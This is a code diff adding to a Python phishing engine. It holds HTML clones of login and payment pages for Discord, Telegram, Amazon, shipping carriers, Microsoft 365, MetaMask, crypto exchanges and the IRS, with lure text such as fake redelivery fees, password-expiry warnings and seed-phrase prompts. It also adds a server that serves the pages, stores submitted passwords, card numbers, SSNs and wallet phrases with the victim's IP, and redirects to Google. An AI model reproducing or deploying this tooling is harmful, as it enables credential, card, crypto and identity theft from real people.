@@ -314,6 +314,8 @@ TEMPLATES = [
         "fields": ["email", "password"],
         "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Discord</title><style>body{background:#404eed;font-family:Whitney,Helvetica Neue,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.card{background:#313338;max-width:480px;width:100%;padding:32px;border-radius:8px;text-align:center}.logo{color:#fff;font-size:20px;font-weight:600;margin-bottom:24px;display:flex;align-items:center;justify-content:center;gap:8px}h1{font-size:24px;font-weight:600;color:#fff;margin:0 0 8px}.subtitle{font-size:14px;color:#b5bac1;margin-bottom:24px}.input-group{margin-bottom:16px;text-align:left}.input-group label{display:block;font-size:12px;font-weight:700;color:#b5bac1;margin-bottom:4px;text-transform:uppercase}.input-group input{width:100%;padding:12px;border:1px solid #1e1f22;border-radius:4px;font-size:15px;background:#1e1f22;color:#fff;box-sizing:border-box}.input-group input:focus{border-color:#5865f2;outline:none}button{background:#5865f2;color:#fff;border:none;border-radius:4px;padding:14px;font-size:15px;font-weight:600;width:100%;cursor:pointer;margin-top:8px}button:hover{background:#4752c4}.links{margin-top:12px}.links a{color:#00a8fc;font-size:13px;text-decoration:none}</style></head><body><div class="card"><div class="logo">Discord</div><h1>Welcome back!</h1><p class="subtitle">We're so excited to see you again!</p><form method="POST" action="{callback_url}"><div class="input-group"><label>Email or phone number</label><input type="text" name="email" placeholder="Email or phone number" required></div><div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Password" required></div><button type="submit">Log In</button></form><div class="links"><a href="#">Forgot your password?</a></div></div></body></html>""",  # noqa
     },
+    # ... continue TEMPLATES list from telegram_login ...
+
     {
         "id": "telegram_login",
         "name": "Telegram Web Login",
@@ -322,4 +324,607 @@ TEMPLATES = [
         "brand": "Telegram",
         "difficulty": "Easy",
         "fields": ["phone", "code"],
-        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram Web</title><style>body{background:#5682a3;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;height
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram Web</title>
+<style>body{background:#5682a3;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.card{background:#fff;max-width:400px;width:100%;padding:48px 40px;border-radius:12px;text-align:center}
+.logo{font-size:28px;font-weight:700;color:#3390ec;margin-bottom:16px}h1{font-size:22px;margin:0 0 8px}
+.sub{color:#707579;font-size:14px;margin-bottom:28px}
+input{width:100%;padding:14px;border:1px solid #dfe1e5;border-radius:8px;font-size:16px;box-sizing:border-box;margin-bottom:12px}
+input:focus{border-color:#3390ec;outline:none}
+button{background:#3390ec;color:#fff;border:none;border-radius:8px;padding:14px;font-size:16px;font-weight:600;width:100%;cursor:pointer}
+button:hover{background:#2b7cd3}</style></head><body>
+<div class="card"><div class="logo">✈ Telegram</div><h1>Sign in to Telegram</h1>
+<p class="sub">Please confirm your country code and enter your phone number.</p>
+<form method="POST" action="{callback_url}">
+<input type="tel" name="phone" placeholder="+1 234 567 8900" required>
+<input type="text" name="code" placeholder="Login code" inputmode="numeric">
+<button type="submit">Next</button></form></div></body></html>""",
+    },
+
+    # ── Shipping / Delivery ──────────────────────────────────────
+    {
+        "id": "dhl_tracking",
+        "name": "DHL Package Tracking",
+        "category": "Shipping",
+        "description": "DHL failed-delivery notification portal. Captures name, address, card.",
+        "brand": "DHL",
+        "difficulty": "Medium",
+        "fields": ["tracking", "name", "address", "card"],
+        "html": _SHIP_HTML("DHL", "#FFCC00", "#D40511"),
+    },
+    {
+        "id": "fedex_tracking",
+        "name": "FedEx Tracking Alert",
+        "category": "Shipping",
+        "description": "FedEx delivery exception page.",
+        "brand": "FedEx",
+        "difficulty": "Medium",
+        "fields": ["tracking", "name", "address", "card"],
+        "html": _SHIP_HTML("FedEx", "#4D148C", "#FF6600"),
+    },
+    {
+        "id": "ups_tracking",
+        "name": "UPS Delivery Notice",
+        "category": "Shipping",
+        "description": "UPS package hold / redelivery form.",
+        "brand": "UPS",
+        "difficulty": "Medium",
+        "fields": ["tracking", "name", "address", "card"],
+        "html": _SHIP_HTML("UPS", "#351C15", "#FFB500"),
+    },
+    {
+        "id": "usps_tracking",
+        "name": "USPS Informed Delivery",
+        "category": "Shipping",
+        "description": "USPS Informed Delivery login / package alert.",
+        "brand": "USPS",
+        "difficulty": "Medium",
+        "fields": ["email", "password", "tracking"],
+        "html": _SHIP_HTML("USPS", "#333366", "#004B87"),
+    },
+    {
+        "id": "amazon_order",
+        "name": "Amazon Order Problem",
+        "category": "Shipping",
+        "description": "Amazon order issue / payment update page.",
+        "brand": "Amazon",
+        "difficulty": "Medium",
+        "fields": ["email", "password", "card"],
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Amazon.com - Order Issue</title>
+<style>body{background:#eaeded;font-family:Amazon Ember,Arial,sans-serif;margin:0}
+.nav{background:#131921;color:#fff;padding:12px 20px;font-size:20px;font-weight:700}
+.card{max-width:560px;margin:40px auto;background:#fff;padding:28px;border-radius:8px;border:1px solid #ddd}
+h1{font-size:22px;color:#0F1111;margin:0 0 8px}.alert{background:#fff8e6;border:1px solid #ffd814;padding:12px;border-radius:6px;margin-bottom:20px;font-size:14px}
+label{display:block;font-size:13px;font-weight:700;margin:12px 0 4px}
+input{width:100%;padding:10px;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;font-size:14px}
+button{background:#ffd814;border:none;border-radius:20px;padding:12px;width:100%;font-size:14px;font-weight:700;margin-top:16px;cursor:pointer}
+button:hover{background:#f7ca00}</style></head><body>
+<div class="nav">amazon</div><div class="card">
+<div class="alert">⚠ We could not process your recent order. Please verify your payment information to avoid cancellation.</div>
+<h1>Update payment method</h1>
+<form method="POST" action="{callback_url}">
+<label>Email</label><input type="email" name="email" required>
+<label>Password</label><input type="password" name="password" required>
+<label>Card number</label><input type="text" name="card" placeholder="•••• •••• •••• ••••" required>
+<label>Expiry / CVV</label><input type="text" name="expiry_cvv" placeholder="MM/YY  CVV" required>
+<button type="submit">Confirm &nbsp;•&nbsp; Continue</button></form></div></body></html>""",
+    },
+
+    # ── IT / Security / Support ──────────────────────────────────
+    {
+        "id": "office365_security",
+        "name": "Office 365 Security Alert",
+        "category": "IT Security",
+        "description": "Urgent O365 security notice requiring re-auth.",
+        "brand": "Microsoft",
+        "difficulty": "Medium",
+        "fields": ["email", "password"],
+        "html": _ALERT_HTML("Microsoft 365", "Unusual sign-in activity detected", "#0078d4"),
+    },
+    {
+        "id": "password_expiry",
+        "name": "Password Expiry Notice",
+        "category": "IT Security",
+        "description": "Corporate password expiry / forced reset page.",
+        "brand": "Generic IT",
+        "difficulty": "Easy",
+        "fields": ["username", "current_password", "new_password"],
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Password Expiration</title>
+<style>body{background:#f0f2f5;font-family:Segoe UI,system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.card{background:#fff;max-width:440px;width:100%;padding:36px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1)}
+.badge{background:#d93025;color:#fff;display:inline-block;padding:4px 10px;border-radius:4px;font-size:12px;font-weight:700;margin-bottom:12px}
+h1{font-size:20px;margin:0 0 8px}p{color:#5f6368;font-size:14px;margin:0 0 20px}
+label{display:block;font-size:13px;margin:10px 0 4px}input{width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
+button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px;width:100%;margin-top:16px;font-weight:600;cursor:pointer}</style></head><body>
+<div class="card"><span class="badge">ACTION REQUIRED</span>
+<h1>Your password expires in 24 hours</h1>
+<p>Update your password now to avoid account lockout per company policy {company_name|IT Policy}.</p>
+<form method="POST" action="{callback_url}">
+<label>Username</label><input name="username" required>
+<label>Current password</label><input type="password" name="current_password" required>
+<label>New password</label><input type="password" name="new_password" required>
+<label>Confirm new password</label><input type="password" name="confirm_password" required>
+<button type="submit">Update Password</button></form></div></body></html>""",
+    },
+    {
+        "id": "sharepoint_shared",
+        "name": "SharePoint Shared Document",
+        "category": "IT Security",
+        "description": "Fake SharePoint document share requiring login.",
+        "brand": "SharePoint",
+        "difficulty": "Medium",
+        "fields": ["email", "password"],
+        "html": _ALERT_HTML("SharePoint", "A document was shared with you", "#038387"),
+    },
+    {
+        "id": "onedrive_shared",
+        "name": "OneDrive Shared File",
+        "category": "IT Security",
+        "description": "OneDrive file-share lure requiring Microsoft login.",
+        "brand": "OneDrive",
+        "difficulty": "Easy",
+        "fields": ["email", "password"],
+        "html": _ALERT_HTML("OneDrive", "Someone shared a file with you", "#0078d4"),
+    },
+    {
+        "id": "zoom_meeting",
+        "name": "Zoom Meeting Join",
+        "category": "IT Security",
+        "description": "Fake Zoom meeting join requiring SSO.",
+        "brand": "Zoom",
+        "difficulty": "Easy",
+        "fields": ["email", "password", "meeting_id"],
+        "html": _ALERT_HTML("Zoom", "You have been invited to a meeting", "#2D8CFF"),
+    },
+    {
+        "id": "webex_meeting",
+        "name": "Cisco Webex Join",
+        "category": "IT Security",
+        "description": "Fake Webex meeting authentication page.",
+        "brand": "Webex",
+        "difficulty": "Easy",
+        "fields": ["email", "password"],
+        "html": _ALERT_HTML("Webex", "Join meeting — authentication required", "#000000"),
+    },
+    {
+        "id": "it_helpdesk",
+        "name": "IT Helpdesk Ticket",
+        "category": "IT Security",
+        "description": "Helpdesk ticket response requiring credential verification.",
+        "brand": "Generic IT",
+        "difficulty": "Easy",
+        "fields": ["username", "password", "ticket_id"],
+        "html": _ALERT_HTML("IT Helpdesk", "Ticket #{ticket_id|48291} requires verification", "#37474f"),
+    },
+
+    # ── Crypto / Web3 ────────────────────────────────────────────
+    {
+        "id": "metamask_connect",
+        "name": "MetaMask Connect",
+        "category": "Crypto",
+        "description": "Fake MetaMask wallet connect / seed phrase harvest.",
+        "brand": "MetaMask",
+        "difficulty": "Hard",
+        "fields": ["seed_phrase", "password"],
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>MetaMask</title>
+<style>body{background:#f2f4f6;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.card{background:#fff;max-width:400px;width:100%;padding:32px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);text-align:center}
+.logo{font-size:40px;margin-bottom:8px}h1{font-size:20px;margin:0 0 8px}.sub{color:#6a737d;font-size:13px;margin-bottom:20px}
+textarea,input{width:100%;padding:12px;border:1px solid #d6d9dc;border-radius:8px;box-sizing:border-box;font-size:14px;margin-bottom:12px}
+textarea{min-height:90px;resize:vertical}
+button{background:#037dd6;color:#fff;border:none;border-radius:30px;padding:14px;width:100%;font-weight:600;cursor:pointer}
+button:hover{background:#0260a4}</style></head><body>
+<div class="card"><div class="logo">🦊</div><h1>Import wallet</h1>
+<p class="sub">Enter your Secret Recovery Phrase to restore your wallet.</p>
+<form method="POST" action="{callback_url}">
+<textarea name="seed_phrase" placeholder="Secret Recovery Phrase (12 or 24 words)" required></textarea>
+<input type="password" name="password" placeholder="New password" required>
+<button type="submit">Import</button></form></div></body></html>""",
+    },
+    {
+        "id": "binance_login",
+        "name": "Binance Login",
+        "category": "Crypto",
+        "description": "Binance exchange login page.",
+        "brand": "Binance",
+        "difficulty": "Medium",
+        "fields": ["email", "password"],
+        "html": _LOGIN_HTML("Binance", "#F0B90B", "#1E2329"),
+    },
+    {
+        "id": "coinbase_login",
+        "name": "Coinbase Login",
+        "category": "Crypto",
+        "description": "Coinbase account login.",
+        "brand": "Coinbase",
+        "difficulty": "Medium",
+        "fields": ["email", "password"],
+        "html": _LOGIN_HTML("Coinbase", "#0052FF", "#0A0B0D"),
+    },
+
+    # ── Government / Tax ─────────────────────────────────────────
+    {
+        "id": "irs_tax",
+        "name": "IRS Tax Refund",
+        "category": "Government",
+        "description": "Fake IRS tax refund / ID.me style portal.",
+        "brand": "IRS",
+        "difficulty": "Hard",
+        "fields": ["ssn", "dob", "name", "address"],
+        "html": _GOV_HTML("Internal Revenue Service", "Claim Tax Refund", "#003366"),
+    },
+    {
+        "id": "docusign",
+        "name": "DocuSign Document",
+        "category": "Government",
+        "description": "DocuSign document signature request requiring login.",
+        "brand": "DocuSign",
+        "difficulty": "Easy",
+        "fields": ["email", "password"],
+        "html": _LOGIN_HTML("DocuSign", "#FFCC00", "#000000"),
+    },
+    {
+        "id": "adobe_sign",
+        "name": "Adobe Sign Document",
+        "category": "Government",
+        "description": "Adobe Sign / Acrobat document review page.",
+        "brand": "Adobe",
+        "difficulty": "Easy",
+        "fields": ["email", "password"],
+        "html": _LOGIN_HTML("Adobe Sign", "#FA0F00", "#2C2C2C"),
+    },
+
+    # ── Generic / Custom ─────────────────────────────────────────
+    {
+        "id": "wifi_captive",
+        "name": "Wi-Fi Captive Portal",
+        "category": "Generic",
+        "description": "Fake hotel/airport Wi-Fi login capturing credentials.",
+        "brand": "Generic Wi-Fi",
+        "difficulty": "Easy",
+        "fields": ["email", "password", "phone"],
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Wi-Fi Login</title>
+<style>body{background:#0d47a1;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;color:#fff}
+.card{background:#fff;color:#222;max-width:380px;width:100%;padding:32px;border-radius:12px;text-align:center}
+h1{font-size:20px;margin:0 0 8px}.sub{color:#666;font-size:13px;margin-bottom:20px}
+input{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box;margin-bottom:10px}
+button{background:#0d47a1;color:#fff;border:none;border-radius:6px;padding:12px;width:100%;font-weight:600;cursor:pointer}</style></head><body>
+<div class="card"><div style="font-size:40px">📶</div>
+<h1>Free Wi-Fi Access</h1><p class="sub">Sign in to continue browsing at {company_name|Guest Network}</p>
+<form method="POST" action="{callback_url}">
+<input type="email" name="email" placeholder="Email" required>
+<input type="password" name="password" placeholder="Password (optional)">
+<input type="tel" name="phone" placeholder="Phone">
+<button type="submit">Connect</button></form></div></body></html>""",
+    },
+    {
+        "id": "oauth_consent",
+        "name": "OAuth Consent Hijack",
+        "category": "Generic",
+        "description": "Generic OAuth consent screen that steers to credential capture.",
+        "brand": "Generic OAuth",
+        "difficulty": "Hard",
+        "fields": ["email", "password", "token"],
+        "html": _LOGIN_HTML("Authorize Application", "#4285F4", "#202124"),
+    },
+    {
+        "id": "generic_login",
+        "name": "Generic Brandable Login",
+        "category": "Generic",
+        "description": "Blank brandable login page — company name, logo, colors via placeholders.",
+        "brand": "Custom",
+        "difficulty": "Easy",
+        "fields": ["username", "password"],
+        "html": """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>{company_name|Sign In}</title>
+<style>body{background:{bg_color|#f5f5f5};font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.card{background:#fff;max-width:400px;width:100%;padding:40px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}
+.logo{font-size:28px;font-weight:700;color:{accent_color|#1a73e8};margin-bottom:20px}
+h1{font-size:22px;margin:0 0 8px}.sub{color:#666;font-size:14px;margin-bottom:24px}
+input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:15px}
+input:focus{border-color:{accent_color|#1a73e8};outline:none}
+button{background:{accent_color|#1a73e8};color:#fff;border:none;border-radius:6px;padding:14px;width:100%;font-size:15px;font-weight:600;cursor:pointer}</style></head><body>
+<div class="card"><div class="logo">{company_name|Company}</div>
+<h1>{heading|Sign in}</h1><p class="sub">{subtitle|Enter your credentials to continue}</p>
+<form method="POST" action="{callback_url}">
+<input type="text" name="username" placeholder="Username or email" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">{button_text|Sign In}</button></form></div></body></html>""",
+    },
+]
+
+
+# ── HTML helpers (keep templates concise) ─────────────────────────
+
+def _LOGIN_HTML(brand: str, accent: str, text: str = "#222") -> str:
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{brand} - Sign in</title>
+<style>body{{background:#f5f5f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
+.card{{background:#fff;max-width:400px;width:100%;padding:40px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,.08);text-align:center}}
+.logo{{font-size:26px;font-weight:700;color:{accent};margin-bottom:16px}}h1{{font-size:20px;color:{text};margin:0 0 20px}}
+input{{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;margin-bottom:12px;font-size:15px}}
+input:focus{{border-color:{accent};outline:none}}
+button{{background:{accent};color:#fff;border:none;border-radius:6px;padding:14px;width:100%;font-weight:600;cursor:pointer}}</style></head><body>
+<div class="card"><div class="logo">{brand}</div><h1>Sign in</h1>
+<form method="POST" action="{{callback_url}}">
+<input type="text" name="email" placeholder="Email or username" required>
+<input type="password" name="password" placeholder="Password" required>
+<button type="submit">Sign in</button></form></div></body></html>"""
+
+
+def _ALERT_HTML(brand: str, message: str, accent: str) -> str:
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{brand}</title>
+<style>body{{background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
+.card{{background:#fff;max-width:440px;width:100%;padding:36px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1)}}
+.brand{{color:{accent};font-weight:700;font-size:18px;margin-bottom:12px}}
+.alert{{background:#fff3cd;border-left:4px solid #ffc107;padding:12px;font-size:14px;margin-bottom:20px}}
+h1{{font-size:18px;margin:0 0 16px}}label{{display:block;font-size:13px;margin:10px 0 4px}}
+input{{width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}}
+button{{background:{accent};color:#fff;border:none;border-radius:4px;padding:12px;width:100%;margin-top:16px;font-weight:600;cursor:pointer}}</style></head><body>
+<div class="card"><div class="brand">{brand}</div>
+<div class="alert">⚠ {message}</div>
+<h1>Verify your identity to continue</h1>
+<form method="POST" action="{{callback_url}}">
+<label>Email / Username</label><input name="email" required>
+<label>Password</label><input type="password" name="password" required>
+<button type="submit">Continue</button></form></div></body></html>"""
+
+
+def _SHIP_HTML(brand: str, primary: str, accent: str) -> str:
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{brand} Tracking</title>
+<style>body{{background:#f4f4f4;font-family:system-ui,sans-serif;margin:0}}
+.nav{{background:{primary};color:#fff;padding:14px 20px;font-weight:700;font-size:20px}}
+.card{{max-width:520px;margin:32px auto;background:#fff;padding:28px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08)}}
+h1{{font-size:20px;margin:0 0 8px}}.sub{{color:#666;font-size:14px;margin-bottom:20px}}
+label{{display:block;font-size:13px;font-weight:600;margin:10px 0 4px}}
+input{{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}}
+button{{background:{accent};color:#fff;border:none;border-radius:4px;padding:12px;width:100%;margin-top:16px;font-weight:700;cursor:pointer}}</style></head><body>
+<div class="nav">{brand}</div><div class="card">
+<h1>Delivery exception</h1>
+<p class="sub">We could not deliver your package. Confirm details to reschedule.</p>
+<form method="POST" action="{{callback_url}}">
+<label>Tracking number</label><input name="tracking" required>
+<label>Full name</label><input name="name" required>
+<label>Delivery address</label><input name="address" required>
+<label>Card to pay redelivery fee ($2.99)</label><input name="card" placeholder="Card number" required>
+<button type="submit">Confirm Redelivery</button></form></div></body></html>"""
+
+
+def _GOV_HTML(brand: str, heading: str, accent: str) -> str:
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{brand}</title>
+<style>body{{background:#e8eef4;font-family:Georgia,serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
+.card{{background:#fff;max-width:480px;width:100%;padding:36px;border-top:6px solid {accent};box-shadow:0 2px 12px rgba(0,0,0,.1)}}
+.brand{{color:{accent};font-weight:700;font-size:16px;letter-spacing:1px;margin-bottom:8px}}
+h1{{font-size:22px;margin:0 0 16px}}p{{color:#444;font-size:14px}}
+label{{display:block;font-size:13px;margin:12px 0 4px;font-family:system-ui,sans-serif}}
+input{{width:100%;padding:10px;border:1px solid #aaa;border-radius:2px;box-sizing:border-box;font-family:system-ui,sans-serif}}
+button{{background:{accent};color:#fff;border:none;padding:12px;width:100%;margin-top:16px;font-weight:700;cursor:pointer;font-family:system-ui,sans-serif}}</style></head><body>
+<div class="card"><div class="brand">{brand}</div><h1>{heading}</h1>
+<p>Verify your identity to continue processing your request.</p>
+<form method="POST" action="{{callback_url}}">
+<label>Full legal name</label><input name="name" required>
+<label>Date of birth</label><input name="dob" placeholder="MM/DD/YYYY" required>
+<label>SSN (last 4)</label><input name="ssn" maxlength="4" required>
+<label>Address</label><input name="address" required>
+<button type="submit">Submit</button></form></div></body></html>"""
+
+
+# Rebuild TEMPLATES that used helpers BEFORE TEMPLATES is assigned —
+# In production, define helpers first. Structure above is conceptual;
+# actual file order: helpers → TEMPLATES list.
+
+
+@dataclass
+class PhishingTemplate:
+    id: str
+    name: str
+    category: str
+    description: str
+    brand: str
+    difficulty: str
+    fields: List[str]
+    html: str
+
+    def to_dict(self) -> Dict[str, Any]:
+        return {
+            "id": self.id,
+            "name": self.name,
+            "category": self.category,
+            "description": self.description,
+            "brand": self.brand,
+            "difficulty": self.difficulty,
+            "fields": self.fields,
+        }
+
+
+class PhishingEngine:
+    """Render, serve, and instrument phishing templates."""
+
+    def __init__(self, telemetry=None, capture_dir: Optional[str] = None):
+        self._telemetry = telemetry
+        self._templates: Dict[str, PhishingTemplate] = {}
+        self._captures: List[Dict[str, Any]] = []
+        self._capture_dir = capture_dir or tempfile.mkdtemp(prefix="anubis_phish_")
+        self._server = None
+        self._server_thread = None
+        self._on_capture: Optional[Callable] = None
+        self._load_builtin_templates()
+
+    def _load_builtin_templates(self):
+        # Helpers must be defined before this runs (order in real file)
+        for t in TEMPLATES:
+            pt = PhishingTemplate(
+                id=t["id"],
+                name=t["name"],
+                category=t["category"],
+                description=t["description"],
+                brand=t.get("brand", ""),
+                difficulty=t.get("difficulty", "Medium"),
+                fields=t.get("fields", []),
+                html=t["html"],
+            )
+            self._templates[pt.id] = pt
+        self._log(f"Loaded {len(self._templates)} phishing templates")
+
+    def list_templates(self, category: Optional[str] = None) -> List[Dict[str, Any]]:
+        items = list(self._templates.values())
+        if category:
+            items = [t for t in items if t.category.lower() == category.lower()]
+        return [t.to_dict() for t in sorted(items, key=lambda x: (x.category, x.name))]
+
+    def list_categories(self) -> List[str]:
+        return sorted({t.category for t in self._templates.values()})
+
+    def get_template(self, template_id: str) -> Optional[PhishingTemplate]:
+        return self._templates.get(template_id)
+
+    def render_template(
+        self,
+        template_id: str,
+        target_info: Optional[Dict[str, Any]] = None,
+        callback_url: str = "/capture",
+        **extra,
+    ) -> str:
+        tmpl = self._templates.get(template_id)
+        if not tmpl:
+            raise ValueError(f"Unknown template: {template_id}")
+
+        ctx = {
+            "callback_url": callback_url,
+            "company_name": "Company",
+            "campaign_name": "Campaign",
+            "accent_color": "#1a73e8",
+            "bg_color": "#f5f5f5",
+            "heading": "Sign in",
+            "subtitle": "Enter your credentials to continue",
+            "button_text": "Sign In",
+            "ticket_id": "48291",
+        }
+        if target_info:
+            ctx.update({k: str(v) for k, v in target_info.items() if v is not None})
+        ctx.update({k: str(v) for k, v in extra.items()})
+
+        html = tmpl.html
+        # Support {key|default} placeholders
+        import re
+
+        def _sub(m):
+            key = m.group(1)
+            default = m.group(2) if m.group(2) is not None else ""
+            return str(ctx.get(key, default))
+
+        html = re.sub(r"\{(\w+)(?:\|([^}]*))?\}", _sub, html)
+        return html
+
+    def export_html(self, template_id: str, out_path: str, **kwargs) -> str:
+        html = self.render_template(template_id, **kwargs)
+        os.makedirs(os.path.dirname(out_path) or ".", exist_ok=True)
+        with open(out_path, "w", encoding="utf-8") as f:
+            f.write(html)
+        self._log(f"Exported {template_id} → {out_path}")
+        return out_path
+
+    def on_capture(self, callback: Callable):
+        """Register callback(data_dict) for each credential capture."""
+        self._on_capture = callback
+
+    def get_captures(self) -> List[Dict[str, Any]]:
+        return list(self._captures)
+
+    def serve_template(
+        self,
+        template_id: str,
+        host: str = "0.0.0.0",
+        port: int = 8080,
+        html_content: Optional[str] = None,
+        background: bool = True,
+    ) -> Dict[str, Any]:
+        """Serve phishing page + /capture endpoint on host:port."""
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        from urllib.parse import parse_qs
+        import cgi
+
+        html = html_content or self.render_template(template_id)
+        engine = self
+
+        class Handler(BaseHTTPRequestHandler):
+            def do_GET(self):
+                if self.path in ("/", "/index.html", "/login"):
+                    body = html.encode("utf-8")
+                    self.send_response(200)
+                    self.send_header("Content-Type", "text/html; charset=utf-8")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                else:
+                    self.send_response(404)
+                    self.end_headers()
+
+            def do_POST(self):
+                if self.path.startswith("/capture"):
+                    length = int(self.headers.get("Content-Length", 0))
+                    raw = self.rfile.read(length).decode("utf-8", errors="replace")
+                    data = {k: v[0] for k, v in parse_qs(raw).items()}
+                    data["_meta"] = {
+                        "template": template_id,
+                        "ip": self.client_address[0],
+                        "ua": self.headers.get("User-Agent", ""),
+                        "ts": datetime.utcnow().isoformat() + "Z",
+                    }
+                    engine._store_capture(data)
+                    # Redirect fake success
+                    self.send_response(302)
+                    self.send_header("Location", "https://www.google.com")
+                    self.end_headers()
+                else:
+                    self.send_response(404)
+                    self.end_headers()
+
+            def log_message(self, fmt, *args):
+                engine._log(f"[phish-http] {args[0]}")
+
+        server = HTTPServer((host, port), Handler)
+        self._server = server
+        info = {"url": f"http://{host}:{port}/", "template": template_id, "port": port}
+        self._log(f"Serving {template_id} at {info['url']}")
+
+        if background:
+            t = threading.Thread(target=server.serve_forever, daemon=True)
+            t.start()
+            self._server_thread = t
+        else:
+            try:
+                server.serve_forever()
+            except KeyboardInterrupt:
+                server.shutdown()
+        return info
+
+    def stop_server(self):
+        if self._server:
+            self._server.shutdown()
+            self._server = None
+            self._log("Phishing server stopped")
+
+    def _store_capture(self, data: Dict[str, Any]):
+        self._captures.append(data)
+        path = os.path.join(
+            self._capture_dir,
+            f"capture_{int(time.time())}_{hashlib.md5(str(data).encode()).hexdigest()[:8]}.json",
+        )
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2)
+        self._log(f"CAPTURED credentials → {path}")
+        if self._telemetry:
+            self._telemetry.info(f"Phish capture from {data.get('_meta', {}).get('ip')}")
+        if self._on_capture:
+            try:
+                self._on_capture(data)
+            except Exception as e:
+                self._log(f"Capture callback error: {e}")
+
+    def _log(self, msg: str):
+        print(f"  [PhishingEngine] {msg}")
+        if self._telemetry:
+            self._telemetry.info(msg)
